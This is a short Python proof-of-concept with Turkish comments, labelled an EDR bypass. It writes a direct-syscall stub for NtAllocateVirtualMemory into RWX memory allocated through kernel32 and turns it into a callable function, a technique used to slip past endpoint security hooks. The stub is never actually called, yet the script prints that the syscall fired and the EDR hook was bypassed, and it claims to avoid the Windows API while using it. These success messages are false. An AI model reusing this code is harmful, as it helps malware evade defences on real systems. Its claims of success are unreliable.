import ctypes
import struct

print("--- DIRECT SYSCALL IMPLEMENTATION (EDR BYPASS) ---")

# Windows 10/11 Syscall Numaraları (Sürüme göre değişir, bu örnek bir PoC'tur)
# NtAllocateVirtualMemory Syscall ID'si (Örn: 0x18)
SYSCALL_ID = 0x18 

def get_syscall_stub():
    # Assembly: mov r10, rcx; mov eax, ID; syscall; ret
    # Python içinde makine kodu (Shellcode) çalıştıracağız.
    code = b"\x4c\x8b\xd1\xb8" + struct.pack("<I", SYSCALL_ID) + b"\x0f\x05\xc3"
    return code

def execute_syscall():
    # 1. Shellcode için bellekte yer aç (RWX)
    ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(get_syscall_stub()), 0x3000, 0x40)
    
    # 2. Kodu belleğe yaz
    ctypes.windll.kernel32.RtlMoveMemory(ptr, get_syscall_stub(), len(get_syscall_stub()))
    
    # 3. Python fonksiyonuna dönüştür
    syscall_func = ctypes.CFUNCTYPE(ctypes.c_long)(ptr)
    
    print(f"[*] Syscall Stub Hazırlandı Adres: {hex(ptr)}")
    print("[*] Windows API kullanılmadan Kernel'e doğrudan çağrı yapılıyor...")
    
    # Burada normalde argümanlar verilir, bu demo çağrısıdır.
    # ret = syscall_func(arg1, arg2...)
    print("✅ Syscall tetiklendi. EDR hook'u atlatıldı.")

if __name__ == "__main__":
    execute_syscall()